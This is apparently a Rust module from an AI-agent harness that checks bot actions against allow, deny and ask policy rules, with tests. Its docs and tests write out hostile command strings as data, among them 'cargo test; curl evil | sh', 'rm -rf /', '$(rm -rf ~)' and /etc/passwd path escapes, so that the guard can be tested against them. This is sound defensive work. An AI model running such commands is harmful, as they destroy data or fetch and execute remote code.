//! Policy evaluation: a pure function from a policy, a bot, a run's worktree and an approval
//! subject to a decision. It reads no clock and touches no file (ARCH-1), so the daemon, the
//! offline `reno policy check` and the tests all get the same answer.
//!
//! # What to know first
//!
//! - **An `allow` rule with a `command` glob never matches a command line that chains,
//!   substitutes or redirects**, so `cargo *` allows `cargo test` and does not allow
//!   `cargo test; rm -rf ~`, which asks instead. The one exception is a *pure output filter
//!   pipeline* such as `cargo test 2>&1 | tail -40`, matched as `cargo test`. See "Commands".
//! - A `deny` or `ask` rule with a `command` glob also matches when any one simple command inside
//!   a chain matches, so a chain cannot hide a denied command.
//! - `/**` means "outside the run's worktree", judged lexically, with no symlink resolution and no
//!   `~` expansion. See "Paths".
//!
//! # Evaluation
//!
//! The rules are tried in order and **the first rule that matches decides**. When none matches,
//! the policy's `default` effect applies and the decision names no rule. A rule matches when
//! every condition it states holds; a condition it leaves out holds for every action. The
//! conditions, in the order they are tested:
//!
//! - `action`: the subject's class is equal.
//! - `scope`: `"*"`, or the run's bot is in the list. A run with no bot matches only `"*"`.
//! - `tool`: the glob matches the whole tool name.
//! - `command`: see below. A subject with no command never matches a rule that states one.
//! - `path`: see below. A subject with no paths never matches a rule that states one.
//!
//! `tool` and `command` globs are [`globset`] globs with their defaults: `*` matches any run of
//! characters including `/` and spaces, `?` one character, `[ab]` a class, `{a,b}` an
//! alternation. Matching is case sensitive and covers the whole string.
//!
//! # Paths
//!
//! A subject's path is judged against the run's worktree (`cwd`) lexically, never through the
//! file system, so symlinks are not followed:
//!
//! 1. A relative path is taken relative to `cwd`.
//! 2. Both are normalised: `.` is dropped, `..` removes the component before it, and `..` at
//!    the root stays at the root. `~` is not expanded.
//! 3. The path is **inside** when the normalised `cwd` is a prefix of it, component by
//!    component (so `/work/src` is inside `/work`, and `/work-other` is not). Anything else is
//!    **outside**, including every path that escapes through `..`.
//! 4. An inside path is matched as the path relative to `cwd`, written with `/` (`src/lib.rs`;
//!    the worktree itself is `.`). An outside path is matched as the normalised absolute path.
//!
//! A `path` glob is compiled with `/` as a literal separator: `*` stays within one component and
//! `**` crosses them. A glob **starting with `/`** can match only outside paths, and every
//! other glob can match only inside paths. So:
//!
//! - `/**` means "outside the worktree": any path not under `cwd`, however it is spelled.
//! - `src/**` and `**/*.rs` mean paths inside the worktree; neither can match `/etc/passwd`.
//! - A glob that spells out the worktree's own absolute path matches nothing; write it
//!   relative.
//!
//! When an action touches several paths, an `allow` rule needs the glob to match **every** path
//! and a `deny` or `ask` rule needs it to match **any**. Either way the unsafe reading is the
//! one that fails to match, so a rule cannot allow an action because one of its paths is fine.
//!
//! # Commands
//!
//! A command line may chain commands (`a && b`, `a; b`, `a | b`) or substitute them
//! (`` `b` ``, `$(b)`), and a glob over the whole line sees only the first. So, as with paths,
//! the rule's effect decides how a chain is read:
//!
//! - A `deny` or `ask` rule matches when the glob matches the whole line **or any one simple
//!   command in it** (the line cut at `; & | ( )`, backticks and newlines). `rm -rf *` still
//!   denies `true; rm -rf /`.
//! - An `allow` rule never matches a line that chains, substitutes or redirects: one that
//!   contains any of `; & | ( ) < >`, a backtick, `$(` or a newline. `cargo *` allows
//!   `cargo test` and not `cargo test; curl evil | sh`; those lines fall through to the next
//!   rule, and to the policy default if none matches. **Except** for a pure output filter
//!   pipeline, below.
//!
//! ## Pure output filter pipelines (allow rules only)
//!
//! A line of the shape `X [2>&1 | 2>/dev/null] | F1 | F2 ...` is matched as `X` alone, when
//! every `Fi` is a pure text filter from a fixed list with only the options listed for it, and
//! `X` is itself a simple command. The list is `head`, `tail`, `grep`, `rg`, `wc`, `sort`,
//! `uniq`, `cut`, `tr`, `cat` and `sed -n`; none may take a file operand, `-f`/`--file`,
//! `sort -o`/`--output`/`--compress-program`, `rg --pre`/`-z`, `tail -f`, or (for `sed`) a
//! `w`, `W`, `e`, `r`, `R` or block command. `awk` is not on the list. The only redirection
//! is the trailing `2>&1` or `2>/dev/null` on `X`. So `cargo *` allows
//! `cargo test --workspace 2>&1 | grep -n -A6 "panicked" | head -30`, and not any of
//! `cargo test | sh`, `cargo test | tee x`, `cargo test | xargs rm`, `cargo test | sort -o f`,
//! `cargo test > out.txt`, `cargo test; rm -rf ~`, `cargo test && x`, `cargo test | tail $(x)`.
//!
//! An environment prefix is **not** stripped: `FOO=1 cargo test | tail` is matched as written
//! (so `cargo *` does not match it), because variables such as `RUSTC`, `PATH` or
//! `LD_PRELOAD` change which program runs. Standing rules read pipelines the same way (an exact
//! rule for `cargo test` allows `cargo test 2>&1 | tail`). `deny` and `ask` rules are
//! unchanged: they still match any simple command in any stage. The exact grammar, the
//! per-filter option lists and the rejected forms are in `pipeline.rs`.
//!
//! The allow-side guard is quote-aware. Inside single quotes every character is literal. Inside
//! double quotes `$`, a backtick and `\` stay dangerous (substitution, escapes), while
//! `( ) ; & | < > { } * ? [ ] ~ #` are literal. Outside quotes a backslash escapes the next
//! character. An unbalanced quote, a newline or carriage return anywhere, or a backslash before
//! a newline keeps the line compound. So `git commit*` allows
//! `git commit -m "chore(deps): cargo update" -- Cargo.lock` and `git commit -m 'a; b | c'`,
//! and not `git commit -m "$(rm -rf ~)"`, `git commit -m x ; rm y` or `git commit -m "x`.
//!
//! This is a guard, not a shell parser. The deny and ask side still cuts at every `; & | ( )`,
//! quoted or not, which can make a deny rule match more than the shell would, never less.
//! The harness's own sandbox remains the control for what a permitted command can do.
//!
//! A glob that does not compile never matches. Validation rejects such a glob, so this only
//! matters for a policy that skipped it.

use std::path::{Component, Path, PathBuf};

use globset::{Glob, GlobBuilder, GlobMatcher};
use serde::Serialize;

use super::pipeline::pure_pipeline_head;
use super::{PolicyDef, PolicyEffect, PolicyRule, RuleScope};
use crate::exec::ApprovalSubject;

/// What the evaluation knows about the run besides the subject.
#[derive(Debug, Clone, Copy)]
pub struct EvalContext<'a> {
    /// The bot the run was submitted for; `None` for a run with no bot.
    pub bot: Option<&'a str>,
    /// The run's worktree. Should be absolute; the daemon only accepts absolute ones.
    pub cwd: &'a Path,
}

/// The rule that decided, when a rule did.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct RuleRef {
    /// The rule's position in the policy, from 0.
    pub index: usize,
    /// Its `note`, or `rules[N]` when it has none.
    pub name: String,
}

/// What the policy says to do with an action.
///
/// `rule` is `None` when no rule matched and the policy's default effect applied.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(tag = "effect", rename_all = "snake_case")]
pub enum PolicyDecision {
    /// Let it happen without asking.
    Allow {
        /// The rule that allowed it.
        rule: Option<RuleRef>,
    },
    /// Refuse it.
    Deny {
        /// The rule that refused it.
        rule: Option<RuleRef>,
        /// Why, for the transcript and the harness.
        message: String,
    },
    /// Ask a human.
    Ask {
        /// The rule that asks.
        rule: Option<RuleRef>,
    },
}

impl PolicyDecision {
    /// The name recorded for who decided: the rule's name, or `default`.
    pub fn rule_name(&self) -> &str {
        let (Self::Allow { rule } | Self::Deny { rule, .. } | Self::Ask { rule }) = self;
        rule.as_ref()
            .map_or(DEFAULT_RULE, |rule| rule.name.as_str())
    }
}

/// The name a decision made by the policy's default effect carries.
pub const DEFAULT_RULE: &str = "default";

/// Decides what happens to `subject`. See the module docs for every rule of the evaluation.
pub fn evaluate(
    policy: &PolicyDef,
    cx: &EvalContext<'_>,
    subject: &ApprovalSubject,
) -> PolicyDecision {
    let cwd = lexical(cx.cwd);
    for (index, rule) in policy.rules.iter().enumerate() {
        if matches(rule, cx.bot, &cwd, subject) {
            let name = rule
                .note
                .clone()
                .unwrap_or_else(|| format!("rules[{index}]"));
            let message = match &rule.note {
                Some(note) => format!("denied by policy: {note}"),
                None => format!("denied by policy rule {name}"),
            };
            return decision(rule.effect, Some(RuleRef { index, name }), message);
        }
    }
    decision(
        policy.default,
        None,
        "denied by the policy's default".to_owned(),
    )
}

fn decision(effect: PolicyEffect, rule: Option<RuleRef>, message: String) -> PolicyDecision {
    match effect {
        PolicyEffect::Allow => PolicyDecision::Allow { rule },
        PolicyEffect::Ask => PolicyDecision::Ask { rule },
        PolicyEffect::Deny => PolicyDecision::Deny { rule, message },
    }
}

fn matches(rule: &PolicyRule, bot: Option<&str>, cwd: &Path, subject: &ApprovalSubject) -> bool {
    let m = &rule.matches;
    if m.action.is_some_and(|action| action != subject.action) {
        return false;
    }
    if let RuleScope::Bots(bots) = &m.scope
        && !bot.is_some_and(|bot| bots.iter().any(|name| name == bot))
    {
        return false;
    }
    if let Some(tool) = &m.tool
        && !matcher(tool).is_some_and(|glob| glob.is_match(&subject.tool))
    {
        return false;
    }
    if let Some(command) = &m.command
        && !subject
            .command
            .as_deref()
            .is_some_and(|line| command_holds(rule.effect, command, line))
    {
        return false;
    }
    if let Some(path) = &m.path
        && !paths_hold(rule.effect, path, cwd, &subject.paths)
    {
        return false;
    }
    true
}

fn matcher(glob: &str) -> Option<GlobMatcher> {
    Glob::new(glob).ok().map(|glob| glob.compile_matcher())
}

// ---- commands ------------------------------------------------------------------------------

/// Characters that end one simple command and start another.
const COMMAND_BREAKS: &[char] = &[';', '&', '|', '\n', '\r', '`', '(', ')'];

pub(crate) fn command_holds(effect: PolicyEffect, glob: &str, line: &str) -> bool {
    let Some(glob) = matcher(glob) else {
        return false;
    };
    match effect {
        PolicyEffect::Allow => allow_matches(&glob, line),
        PolicyEffect::Deny | PolicyEffect::Ask => {
            glob.is_match(line)
                || line
                    .split(COMMAND_BREAKS)
                    .map(str::trim)
                    .filter(|part| !part.is_empty())
                    .any(|part| glob.is_match(part))
        }
    }
}

/// An `allow` glob holds a simple command, or a pure pipeline whose first command it holds.
fn allow_matches(glob: &GlobMatcher, line: &str) -> bool {
    if !chains_or_redirects(line) {
        return glob.is_match(line);
    }
    pure_pipeline_head(line).is_some_and(|command| glob.is_match(command))
}

/// Whether an `allow` glob must treat `line` as compound: it chains, substitutes or redirects
/// outside quotes, or its quoting cannot be read with confidence.
///
/// Quote-aware, in this scanner's terms:
///
/// - Outside quotes: `; & | ( ) < >`, a backtick and `$(` make it compound. A backslash escapes
///   the next character (so `\;` is a literal `;`), except that a backslash before a newline,
///   or at the end of the line, is compound.
/// - Inside single quotes everything is literal.
/// - Inside double quotes `$`, a backtick and `\` are dangerous (substitution, escapes) and make
///   it compound; `( ) ; & | < > { } * ? [ ] ~ #` are literal.
/// - A newline or carriage return is compound wherever it is, and an unbalanced quote is compound.
pub(super) fn chains_or_redirects(line: &str) -> bool {
    #[derive(Clone, Copy, PartialEq)]
    enum Q {
        None,
        Single,
        Double,
    }
    let mut quote = Q::None;
    let mut chars = line.chars().peekable();
    while let Some(c) = chars.next() {
        if matches!(c, '\n' | '\r') {
            return true;
        }
        match (quote, c) {
            (Q::Single, '\'') | (Q::Double, '"') => quote = Q::None,
            (Q::Single, _) => {}
            (Q::Double, '$' | '`' | '\\') => return true,
            (Q::Double, _) => {}
            (Q::None, '\'') => quote = Q::Single,
            (Q::None, '"') => quote = Q::Double,
            (Q::None, '\\') => match chars.next() {
                None | Some('\n' | '\r') => return true,
                Some(_) => {}
            },
            (Q::None, '$') if chars.peek() == Some(&'(') => return true,
            (Q::None, ';' | '&' | '|' | '(' | ')' | '<' | '>' | '`') => return true,
            (Q::None, _) => {}
        }
    }
    quote != Q::None
}

// ---- paths ---------------------------------------------------------------------------------

/// Where a path is, relative to the worktree, as a string to match a glob against.
enum Located {
    /// Under the worktree: the path relative to it.
    Inside(String),
    /// Anywhere else: the normalised absolute path.
    Outside(String),
}

fn paths_hold(effect: PolicyEffect, glob: &str, cwd: &Path, paths: &[PathBuf]) -> bool {
    let one = |path: &PathBuf| path_matches(glob, cwd, path);
    match effect {
        PolicyEffect::Allow => !paths.is_empty() && paths.iter().all(one),
        PolicyEffect::Deny | PolicyEffect::Ask => paths.iter().any(one),
    }
}

/// Whether one path is matched by a path glob, by the rules of "Paths" above. `cwd` must already
/// be [`lexical`].
pub(crate) fn path_matches(glob: &str, cwd: &Path, path: &Path) -> bool {
    let Ok(built) = GlobBuilder::new(glob).literal_separator(true).build() else {
        return false;
    };
    let matcher = built.compile_matcher();
    match locate(cwd, path) {
        Located::Inside(relative) => !glob.starts_with('/') && matcher.is_match(&relative),
        Located::Outside(absolute) => glob.starts_with('/') && matcher.is_match(&absolute),
    }
}

/// Where `path` is relative to the worktree `cwd` (already [`lexical`]): the path relative to it
/// for an inside path, else the normalised absolute path. Returns `(is_inside, text)`.
pub(crate) fn locate_text(cwd: &Path, path: &Path) -> (bool, String) {
    match locate(cwd, path) {
        Located::Inside(text) => (true, text),
        Located::Outside(text) => (false, text),
    }
}

fn locate(cwd: &Path, path: &Path) -> Located {
    let full = lexical(&cwd.join(path));
    match full.strip_prefix(cwd) {
        Ok(relative) => {
            let parts: Vec<_> = relative
                .components()
                .map(|part| part.as_os_str().to_string_lossy())
                .collect();
            Located::Inside(if parts.is_empty() {
                ".".to_owned()
            } else {
                parts.join("/")
            })
        }
        Err(_) => {
            let shown = full.to_string_lossy();
            Located::Outside(if full.is_absolute() {
                shown.into_owned()
            } else {
                // A relative worktree cannot say what is above it; call that outside.
                format!("/{shown}")
            })
        }
    }
}

/// `path` with `.` removed and `..` resolved against the component before it, lexically.
pub(crate) fn lexical(path: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for part in path.components() {
        match part {
            Component::CurDir => {}
            Component::ParentDir => match out.components().next_back() {
                Some(Component::Normal(_)) => {
                    out.pop();
                }
                // `..` at the root stays at the root.
                Some(Component::RootDir | Component::Prefix(_)) => {}
                _ => out.push(".."),
            },
            other => out.push(other.as_os_str()),
        }
    }
    out
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;
    use crate::exec::ActionClass;

    fn policy(toml_text: &str) -> PolicyDef {
        toml::from_str(toml_text).expect("a policy")
    }

    fn subject(
        action: ActionClass,
        tool: &str,
        command: Option<&str>,
        paths: &[&str],
    ) -> ApprovalSubject {
        ApprovalSubject {
            action,
            tool: tool.to_owned(),
            command: command.map(str::to_owned),
            paths: paths.iter().map(PathBuf::from).collect(),
            raw: serde_json::Value::Null,
        }
    }

    fn command(line: &str) -> ApprovalSubject {
        subject(ActionClass::Command, "bash", Some(line), &[])
    }

    fn edit(paths: &[&str]) -> ApprovalSubject {
        subject(ActionClass::Edit, "write", None, paths)
    }

    fn eval(policy: &PolicyDef, bot: Option<&str>, subject: &ApprovalSubject) -> PolicyDecision {
        evaluate(
            policy,
            &EvalContext {
                bot,
                cwd: Path::new("/work/tree"),
            },
            subject,
        )
    }

    #[derive(Debug)]
    struct Named(&'static str, String);

    impl PartialEq<(&str, &str)> for Named {
        fn eq(&self, other: &(&str, &str)) -> bool {
            self.0 == other.0 && self.1 == other.1
        }
    }

    fn named(decision: &PolicyDecision) -> Named {
        let kind = match decision {
            PolicyDecision::Allow { .. } => "allow",
            PolicyDecision::Deny { .. } => "deny",
            PolicyDecision::Ask { .. } => "ask",
        };
        Named(kind, decision.rule_name().to_owned())
    }

    #[test]
    fn the_first_matching_rule_decides_and_order_matters() {
        let p = policy(
            r#"
            [[rules]]
            note = "no reset"
            effect = "deny"
            match = { action = "command", command = "git reset*" }
            [[rules]]
            note = "any git"
            effect = "allow"
            match = { action = "command", command = "git *" }
            "#,
        );
        assert_eq!(
            named(&eval(&p, None, &command("git reset --hard"))),
            ("deny", "no reset")
        );
        assert_eq!(
            named(&eval(&p, None, &command("git status"))),
            ("allow", "any git")
        );
        let flipped = PolicyDef {
            rules: p.rules.iter().rev().cloned().collect(),
            ..p
        };
        assert_eq!(
            named(&eval(&flipped, None, &command("git reset --hard"))),
            ("allow", "any git"),
            "the earlier rule wins, so reordering changes the answer"
        );
    }

    #[test]
    fn no_match_applies_the_default_and_names_no_rule() {
        for (default, kind) in [("allow", "allow"), ("ask", "ask"), ("deny", "deny")] {
            let p = policy(&format!(
                "default = \"{default}\"\n[[rules]]\neffect = \"deny\"\nmatch = {{ action = \"network\" }}"
            ));
            let decision = eval(&p, None, &command("ls"));
            assert_eq!(named(&decision), (kind, DEFAULT_RULE));
            let (PolicyDecision::Allow { rule }
            | PolicyDecision::Deny { rule, .. }
            | PolicyDecision::Ask { rule }) = &decision;
            assert!(rule.is_none());
        }
        assert_eq!(
            named(&eval(&PolicyDef::default(), None, &command("ls"))),
            ("ask", DEFAULT_RULE),
            "an empty policy asks"
        );
    }

    #[test]
    fn a_rule_without_a_note_is_named_by_its_position() {
        let p = policy(
            "[[rules]]\neffect = \"ask\"\nmatch = { action = \"read\" }\n[[rules]]\neffect = \"deny\"\nmatch = { action = \"network\" }",
        );
        let decision = eval(&p, None, &subject(ActionClass::Network, "fetch", None, &[]));
        assert_eq!(named(&decision), ("deny", "rules[1]"));
        let PolicyDecision::Deny { message, rule } = decision else {
            panic!("a deny");
        };
        assert_eq!(rule.unwrap().index, 1);
        assert_eq!(message, "denied by policy rule rules[1]");
    }

    #[test]
    fn a_deny_carries_the_rules_note_as_its_message() {
        let p = policy(
            "[[rules]]\nnote = \"force push\"\neffect = \"deny\"\nmatch = { command = \"git push*--force*\" }",
        );
        let PolicyDecision::Deny { message, .. } =
            eval(&p, None, &command("git push --force origin"))
        else {
            panic!("a deny");
        };
        assert_eq!(message, "denied by policy: force push");
        let PolicyDecision::Deny { message, .. } = eval(
            &PolicyDef {
                default: PolicyEffect::Deny,
                ..PolicyDef::default()
            },
            None,
            &command("ls"),
        ) else {
            panic!("a deny");
        };
        assert_eq!(message, "denied by the policy's default");
    }

    #[test]
    fn every_condition_must_hold() {
        let p = policy(
            r#"
            default = "deny"
            [[rules]]
            note = "r"
            effect = "allow"
            match = { action = "command", tool = "ba*", command = "cargo *" }
            "#,
        );
        assert_eq!(named(&eval(&p, None, &command("cargo test"))).0, "allow");
        // Wrong action class.
        let mcp = subject(ActionClass::McpTool, "bash", Some("cargo test"), &[]);
        assert_eq!(named(&eval(&p, None, &mcp)).0, "deny");
        // Wrong tool.
        let other_tool = subject(ActionClass::Command, "sh", Some("cargo test"), &[]);
        assert_eq!(named(&eval(&p, None, &other_tool)).0, "deny");
        // Wrong command.
        assert_eq!(named(&eval(&p, None, &command("make"))).0, "deny");
        // No command at all never matches a rule that states one.
        let none = subject(ActionClass::Command, "bash", None, &[]);
        assert_eq!(named(&eval(&p, None, &none)).0, "deny");
    }

    #[test]
    fn a_tool_glob_matches_the_whole_name() {
        let p = policy(
            "default = \"deny\"\n[[rules]]\neffect = \"ask\"\nmatch = { tool = \"mcp__github__*\" }",
        );
        let github = subject(ActionClass::McpTool, "mcp__github__create_issue", None, &[]);
        assert_eq!(named(&eval(&p, None, &github)).0, "ask");
        let other = subject(ActionClass::McpTool, "mcp__slack__post", None, &[]);
        assert_eq!(named(&eval(&p, None, &other)).0, "deny");
        let prefix = subject(ActionClass::McpTool, "x_mcp__github__y", None, &[]);
        assert_eq!(named(&eval(&p, None, &prefix)).0, "deny");
    }

    #[test]
    fn scope_limits_a_rule_to_its_bots() {
        let p = policy(
            r#"
            default = "ask"
            [[rules]]
            note = "cargo for builders"
            effect = "allow"
            match = { action = "command", command = "cargo *", scope = ["builder", "keeper"] }
            "#,
        );
        let cargo = command("cargo build");
        assert_eq!(
            named(&eval(&p, Some("builder"), &cargo)),
            ("allow", "cargo for builders")
        );
        assert_eq!(named(&eval(&p, Some("keeper"), &cargo)).0, "allow");
        assert_eq!(
            named(&eval(&p, Some("scout"), &cargo)),
            ("ask", DEFAULT_RULE)
        );
        assert_eq!(
            named(&eval(&p, None, &cargo)),
            ("ask", DEFAULT_RULE),
            "a run with no bot is in no list"
        );
        let all = policy(
            "default = \"deny\"\n[[rules]]\neffect = \"ask\"\nmatch = { scope = \"*\", action = \"read\" }",
        );
        let read = subject(ActionClass::Read, "cat", None, &[]);
        assert_eq!(named(&eval(&all, None, &read)).0, "ask");
        assert_eq!(named(&eval(&all, Some("anyone"), &read)).0, "ask");
    }

    fn outside_policy() -> PolicyDef {
        policy(
            r#"
            default = "allow"
            [[rules]]
            note = "outside"
            effect = "deny"
            match = { action = "edit", path = "/**" }
            "#,
        )
    }

    #[test]
    fn slash_star_star_means_outside_the_worktree() {
        let p = outside_policy();
        let denied = |paths: &[&str]| named(&eval(&p, None, &edit(paths))).0 == "deny";
        // Inside, however spelled: allowed.
        assert!(!denied(&["src/lib.rs"]));
        assert!(!denied(&["/work/tree/src/lib.rs"]));
        assert!(!denied(&["./src/../src/lib.rs"]));
        assert!(!denied(&["/work/tree"]), "the worktree itself is inside");
        assert!(!denied(&["."]));
        assert!(!denied(&["/work/tree/a/../b"]));
        // Outside: denied.
        assert!(denied(&["/etc/passwd"]));
        assert!(denied(&["/work/other/file"]));
        assert!(
            denied(&["/work/tree-sibling/file"]),
            "a name prefix is not inside"
        );
        assert!(denied(&["/work"]), "the parent is outside");
        assert!(denied(&["/"]));
    }

    #[test]
    fn a_dotdot_escape_is_outside() {
        let p = outside_policy();
        let denied = |paths: &[&str]| named(&eval(&p, None, &edit(paths))).0 == "deny";
        assert!(denied(&["../outside.txt"]));
        assert!(denied(&["src/../../outside.txt"]));
        assert!(denied(&["/work/tree/../other/x"]));
        assert!(denied(&["/work/tree/src/../../../etc/passwd"]));
        assert!(
            denied(&["../../../../../../etc/passwd"]),
            "`..` stops at the root"
        );
        // A `..` that stays inside is inside.
        assert!(!denied(&["src/../lib.rs"]));
        assert!(!denied(&["a/b/../../c"]));
    }

    #[test]
    fn a_relative_glob_matches_inside_paths_only() {
        let p = policy(
            r#"
            default = "deny"
            [[rules]]
            note = "sources"
            effect = "allow"
            match = { action = "edit", path = "src/**" }
            [[rules]]
            note = "any rust"
            effect = "ask"
            match = { action = "edit", path = "**/*.rs" }
            "#,
        );
        let d = |path: &str| named(&eval(&p, None, &edit(&[path])));
        assert_eq!(d("src/a/b.rs"), ("allow", "sources"));
        assert_eq!(d("/work/tree/src/a.rs"), ("allow", "sources"));
        assert_eq!(d("lib/a.rs"), ("ask", "any rust"));
        assert_eq!(d("README.md"), ("deny", DEFAULT_RULE));
        // Outside the worktree neither relative glob can match, even `**/*.rs`.
        assert_eq!(d("/etc/x.rs"), ("deny", DEFAULT_RULE));
        assert_eq!(d("../sibling/src/a.rs"), ("deny", DEFAULT_RULE));
        // `*` does not cross a separator in a path glob.
        let star = policy(
            "default = \"deny\"\n[[rules]]\neffect = \"allow\"\nmatch = { path = \"*.md\" }",
        );
        assert_eq!(named(&eval(&star, None, &edit(&["README.md"]))).0, "allow");
        assert_eq!(
            named(&eval(&star, None, &edit(&["docs/README.md"]))).0,
            "deny"
        );
    }

    #[test]
    fn an_absolute_glob_matches_outside_paths_only() {
        let p = policy(
            r#"
            default = "deny"
            [[rules]]
            note = "tmp"
            effect = "allow"
            match = { action = "edit", path = "/tmp/**" }
            "#,
        );
        let d = |path: &str| named(&eval(&p, None, &edit(&[path]))).0;
        assert_eq!(d("/tmp/scratch/a"), "allow");
        assert_eq!(d("/var/a"), "deny");
        // Spelling the worktree's absolute path in a glob matches nothing.
        let inside = policy(
            "default = \"deny\"\n[[rules]]\neffect = \"allow\"\nmatch = { path = \"/work/tree/**\" }",
        );
        assert_eq!(named(&eval(&inside, None, &edit(&["src/a"]))).0, "deny");
        assert_eq!(
            named(&eval(&inside, None, &edit(&["/work/tree/src/a"]))).0,
            "deny"
        );
    }

    #[test]
    fn several_paths_need_all_for_allow_and_any_for_deny_and_ask() {
        let allow = policy(
            "default = \"deny\"\n[[rules]]\neffect = \"allow\"\nmatch = { path = \"src/**\" }",
        );
        assert_eq!(
            named(&eval(&allow, None, &edit(&["src/a", "src/b"]))).0,
            "allow"
        );
        assert_eq!(
            named(&eval(&allow, None, &edit(&["src/a", "/etc/passwd"]))).0,
            "deny",
            "one path outside the rule spoils an allow"
        );
        let deny =
            policy("default = \"allow\"\n[[rules]]\neffect = \"deny\"\nmatch = { path = \"/**\" }");
        assert_eq!(
            named(&eval(&deny, None, &edit(&["src/a", "/etc/passwd"]))).0,
            "deny"
        );
        assert_eq!(
            named(&eval(&deny, None, &edit(&["src/a", "src/b"]))).0,
            "allow"
        );
        let ask = policy(
            "default = \"allow\"\n[[rules]]\neffect = \"ask\"\nmatch = { path = \"**/.env\" }",
        );
        assert_eq!(named(&eval(&ask, None, &edit(&["a", "cfg/.env"]))).0, "ask");
    }

    #[test]
    fn a_path_rule_never_matches_a_subject_without_paths() {
        for effect in ["allow", "deny", "ask"] {
            let p = policy(&format!(
                "default = \"ask\"\n[[rules]]\nnote = \"p\"\neffect = \"{effect}\"\nmatch = {{ action = \"command\", path = \"**\" }}"
            ));
            assert_eq!(
                named(&eval(&p, None, &command("ls"))),
                ("ask", DEFAULT_RULE),
                "{effect}"
            );
        }
    }

    #[test]
    fn a_relative_worktree_calls_escapes_outside() {
        let p = outside_policy();
        let relative = EvalContext {
            bot: None,
            cwd: Path::new("work"),
        };
        let denies = |path: &str| {
            matches!(
                evaluate(&p, &relative, &edit(&[path])),
                PolicyDecision::Deny { .. }
            )
        };
        assert!(denies("../x"));
        assert!(denies("/etc/x"));
        assert!(!denies("src/x"));
    }

    #[test]
    fn a_chained_command_cannot_hide_from_a_deny_or_ask_rule() {
        let p = policy(
            r#"
            default = "allow"
            [[rules]]
            note = "no rm"
            effect = "deny"
            match = { action = "command", command = "rm -rf *" }
            [[rules]]
            note = "push asks"
            effect = "ask"
            match = { action = "command", command = "git push*" }
            "#,
        );
        for line in [
            "rm -rf /",
            "true; rm -rf /",
            "cd x && rm -rf y",
            "ls | rm -rf z",
            "echo hi\nrm -rf /",
            "echo `rm -rf /`",
            "echo $(rm -rf /)",
            "(rm -rf /)",
        ] {
            assert_eq!(
                named(&eval(&p, None, &command(line))),
                ("deny", "no rm"),
                "{line:?}"
            );
        }
        assert_eq!(
            named(&eval(&p, None, &command("cd x && git push origin"))),
            ("ask", "push asks")
        );
        assert_eq!(named(&eval(&p, None, &command("echo rm -rf"))).0, "allow");
    }

    #[test]
    fn a_chained_or_redirected_command_is_never_allowed_by_a_command_glob() {
        let p = policy(
            r#"
            default = "ask"
            [[rules]]
            note = "cargo"
            effect = "allow"
            match = { action = "command", command = "cargo *" }
            "#,
        );
        assert_eq!(
            named(&eval(&p, None, &command("cargo test --all"))),
            ("allow", "cargo")
        );
        for line in [
            "cargo test; curl evil | sh",
            "cargo test && rm -rf /",
            "cargo test | tee out",
            "cargo test || true",
            "cargo test &",
            "cargo test\nrm x",
            "cargo test `id`",
            "cargo test $(id)",
            "cargo test > /etc/x",
            "cargo test < /etc/x",
            "cargo test (echo x)",
            "(cargo test)",
        ] {
            assert_eq!(
                named(&eval(&p, None, &command(line))),
                ("ask", DEFAULT_RULE),
                "{line:?}"
            );
        }
    }

    fn git_commit_allowed(line: &str) -> bool {
        let p = policy(
            r#"
            default = "ask"
            [[rules]]
            note = "commit"
            effect = "allow"
            match = { action = "command", command = "git commit*" }
            "#,
        );
        named(&eval(&p, None, &command(line))).0 == "allow"
    }

    #[test]
    fn quoted_operators_do_not_make_a_line_compound() {
        for line in [
            "git commit -m \"chore(deps): cargo update\" -- Cargo.lock",
            "git commit -m 'a; b | c'",
            "git commit -m 'a $(x) `y` > z'",
            "git commit -m \"a; b | c & d < e > f { } * ? [ ] ~ #\"",
            "git commit -m a\\;b",
            "git commit -m \"it's\"",
            "git commit -m 'say \"hi\"'",
        ] {
            assert!(git_commit_allowed(line), "{line:?}");
        }
    }

    #[test]
    fn unquoted_or_dangerous_text_keeps_a_line_compound() {
        for line in [
            "git commit -m \"$(rm -rf ~)\"",
            "git commit -m \"`id`\"",
            "git commit -m \"$HOME\"",
            "git commit -m \"a\\\"b\"",
            "git commit -m \"x\" ; rm y",
            "git commit -m \"x\" && rm y",
            "git commit -m \"x\" > f",
            "git commit -m \"x",
            "git commit -m 'x",
            "git commit -m x\\\ny",
            "git commit -m x\\",
            "git commit -m \"a\nb\"",
            "git commit -m 'a\nb'",
            "git commit -m \\' ; rm y",
            "git commit -m 'a'; rm y",
            "git commit -m $(id)",
        ] {
            assert!(!git_commit_allowed(line), "{line:?}");
        }
    }

    #[test]
    fn a_deny_rule_still_cuts_inside_quotes() {
        let p = policy(
            r#"
            default = "allow"
            [[rules]]
            note = "no rm"
            effect = "deny"
            match = { action = "command", command = "rm *" }
            "#,
        );
        assert_eq!(
            named(&eval(&p, None, &command("echo \"a; rm -rf x\""))).0,
            "deny"
        );
    }

    mod quote_props {
        use super::super::chains_or_redirects;
        use proptest::prelude::*;

        const OPS: &[&str] = &[
            ";", "&", "|", "(", ")", "<", ">", "`", "$(", "\n", "&&", "||",
        ];
        const LITERAL: &[&str] = &[
            ";", "&", "|", "(", ")", "<", ">", "{", "}", "*", "?", "[", "]", "~", "#", "x", " ",
        ];

        proptest! {
            /// An operator outside quotes always makes the line compound.
            #[test]
            fn an_unquoted_operator_is_never_allow_matchable(
                op in proptest::sample::select(OPS),
                before in "[a-z ]{0,6}",
                quoted in proptest::collection::vec(proptest::sample::select(LITERAL), 0..5),
                after in "[a-z ]{0,6}",
            ) {
                let q: String = quoted.concat();
                let line = format!("git commit -m \"{q}\" {before}{op}{after}");
                prop_assert!(chains_or_redirects(&line), "{line:?}");
                let line = format!("git commit -m '{q}' {before}{op}{after}");
                prop_assert!(chains_or_redirects(&line), "{line:?}");
            }

            /// Quoted operators alone never make a line compound.
            #[test]
            fn quoted_operators_alone_are_never_compound(
                parts in proptest::collection::vec(proptest::sample::select(LITERAL), 0..8),
                single in any::<bool>(),
            ) {
                let q: String = parts.concat();
                let line = if single {
                    format!("git commit -m '{q}' -- f")
                } else {
                    format!("git commit -m \"{q}\" -- f")
                };
                prop_assert!(!chains_or_redirects(&line), "{line:?}");
            }

            /// Substitution inside double quotes keeps the line compound.
            #[test]
